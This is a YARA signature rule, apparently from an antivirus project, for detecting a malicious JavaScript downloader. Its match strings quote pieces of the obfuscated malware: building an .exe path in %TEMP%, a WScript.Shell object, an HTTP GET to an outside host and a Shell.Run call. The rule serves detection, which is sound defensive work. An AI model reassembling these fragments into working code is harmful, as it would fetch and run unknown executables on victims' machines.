rule sig_20160328_bf5ad0321fea2e97a652654e2824276c {
  meta:
    description = "datamaliciousorder - file 20160328_bf5ad0321fea2e97a652654e2824276c.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "16a5117a46588dfd37d329e55991bf1bdaf06f8dae78c8a5cc7b3c28a5870f48"

  strings:
    $s1  = "function Bljefe() {return Fwlfa[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"D2WGKbt1Y1puWg.exe\";};" fullword ascii
    $s2  = "do {WScript[Lmuycbxt](Edmcick() * 11)} while (Wsadefyh[\"readystate\"] < 2 * 2);" fullword ascii
    $s3  = "var Fwlfa = function Grnekjk() {return WScript[Fzhrigtpli](\"WScript.Shell\");}();" fullword ascii
    $s4  = "Wsadefyh[Zysge](\"GET\", \"http://topreal.us/l1oad\", false);" fullword ascii
    $s5  = "function Ffebe(Iirgyfhbq, Dhhnat){return Iirgyfhbq - Dhhnat;};" fullword ascii
    $s6  = "function Jnqaebj() {return ((Zsekkrel == true) && (Zsekkrel == Cxnkbh)) ? 1 : Ihhju;};" fullword ascii
    $s7  = "function Frrsxce(Wuujd){Fwlfa[\"Run\"](Wuujd, Ihhju, Ihhju);};" fullword ascii
    $s8  = "function Jwgnpgjgqa(){return Fzhrigtpli;};" fullword ascii
    $s9  = " while (Pmzlqjkkzh){" fullword ascii
    $s10 = "var Zsekkrel = false;" fullword ascii
    $s11 = "function Qyewngd(){return Lledprvus;};" fullword ascii
    $s12 = "Cxnkbh = true; " fullword ascii
    $s13 = "return Ffebe(Fdgkjtv, Zaccwsl);" fullword ascii
    $s14 = "function Edmcick(){return 22;};" fullword ascii
    $s15 = "Zsekkrel = true; " fullword ascii
    $s16 = "function Fhufqxtayw()" fullword ascii
    $s17 = "var Gnxbtulyj = new this[\"Date\"]();" fullword ascii
    $s18 = "var Cxnkbh = false;" fullword ascii
    $s19 = "var Ftejhahg = false;" fullword ascii
    $s20 = "function Ihptx(Iiamos) {var Qvsgpd = (1, 2, 3, 4, 5, Iiamos); return Qvsgpd;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}